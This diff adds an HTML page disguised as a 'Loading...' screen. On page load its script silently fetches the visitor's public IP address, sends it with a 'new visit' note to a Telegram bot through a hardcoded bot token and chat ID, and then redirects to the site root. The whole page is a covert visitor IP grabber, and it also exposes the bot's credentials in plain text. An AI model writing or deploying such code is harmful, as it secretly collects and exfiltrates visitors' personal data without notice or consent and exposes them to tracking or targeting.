@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Загрузка...</title>
+        <meta charset="UTF-8">
+    </head>
+    <script>
+        let Log = "";
+
+        const Token = '7961362245:AAEhXP1-rY8Dbtje2ZODTkBchfwvjib37JI';
+        const chatId = '7339807316';
+        const url = `https://api.telegram.org/bot${Token}/sendMessage`;
+
+        async function Main1() {
+            Log = "Новое посещение (#Bobrolend)\n";
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => Main2(data));
+        }
+
+        async function Main2(data) {
+            Log += data.ip;
+
+            const response = await fetch(url, {
+                method:'POST',
+                headers: {
+                    'Content-Type':'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: Log
+                })
+            });
+
+            if (response.ok) location.href = '/'
+            else location.href = '/'
+        }
+
+        Main1();
+    </script>
+</html>
